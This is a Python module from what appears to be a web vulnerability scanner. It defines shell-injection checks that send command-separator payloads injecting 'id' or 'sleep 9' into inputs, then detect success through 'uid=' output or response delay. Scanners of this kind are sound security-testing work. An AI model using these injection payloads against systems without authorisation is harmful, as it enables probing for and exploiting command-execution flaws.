import re
from ava.common.check import _ValueCheck, _TimingCheck
from ava.common.exception import InvalidFormatException


# metadata
name = __name__
description = "checks for shell injection"


class ShellInjectionCheck(_ValueCheck):
    """
    Checks for Shell Injection by executing the 'id' command. The payload uses shell separators to inject 'id', such
    as ;, &&, ||, \n, and backticks.
    """
    key = "shell.value.command"
    name = "Shell Injection"
    description = "checks for shell injection by executing commands"
    example = "; id #"

    def __init__(self):
        """Define static payloads"""
        self._payloads = [
            # no quotes
            '; id #',
            '| id #',
            '&& id #',
            '|| id #',
            # single quotes
            "' ; id #",
            "' | id #",
            "' && id #",
            "' || id #",
            # double quotes
            '" ; id #',
            '" | id #',
            '" && id #',
            '" || id #',
            # inside quotes
            '`id`',
            '$(id)'
        ]

    def check(self, response, payload):
        """
        Checks for Shell Injection by looking for the output of 'id' in the response's body.
        :param response: response object from server
        :param payload: payload value
        :return: true if vulnerable, false otherwise
        """
        # check response body
        if not response.text:
            return False

        # check for output
        # uid=user gid=group groups=groups
        regex = r"(uid=\d+[\(\)\w\-]+)(\s+gid=\d+[\(\)\w\-]+)(\s+groups=\d+[\(\)\w\-,]+)?"
        if re.search(regex, response.text):
            return True
        else:
            return False

    def _check_payloads(self, payloads):
        """
        Checks if the payloads are adoptable for this class and modify the payloads to adjust to check function.
        InvalidFormatException is raised, if a payload is not adoptable.
        Children can override.
        :param payloads: list of payloads
        :return: list of modified payloads
        """
        for i, payload in enumerate(payloads):
            if 'id' not in payload:
                raise InvalidFormatException("Payload of {} must include 'id'".format(self.key))
        return payloads


class ShellInjectionTimingCheck(_TimingCheck):
    """
    Checks for Shell Injection by executing the 'sleep' command. The payload uses shell separators to inject 'sleep',
    such as ;, &&, ||, \n, and backticks.
    """
    key = "shell.timing.sleep"
    name = "Shell Injection Timing"
    description = "checks for shell injection by executing delays"
    example = "; sleep 9 #"

    def __init__(self):
        """Define static payloads"""
        self._payloads = [
            # no quotes
            ('; sleep 9 #', 9.00),
            ('| sleep 9 #', 9.00),
            ('&& sleep 9 #', 9.00),
            ('|| sleep 9 #', 9.00),
            # single quotes
            ("' ; sleep 9 #", 9.00),
            ("' | sleep 9 #", 9.00),
            ("' && sleep 9 #", 9.00),
            ("' || sleep 9 #", 9.00),
            # double quotes
            ('" ; sleep 9 #', 9.00),
            ('" | sleep 9 #', 9.00),
            ('" && sleep 9 #', 9.00),
            ('" || sleep 9 #', 9.00),
            # inside quotes
            ('`sleep 9`', 9.00),
            ('$(sleep 9)', 9.00)
        ]
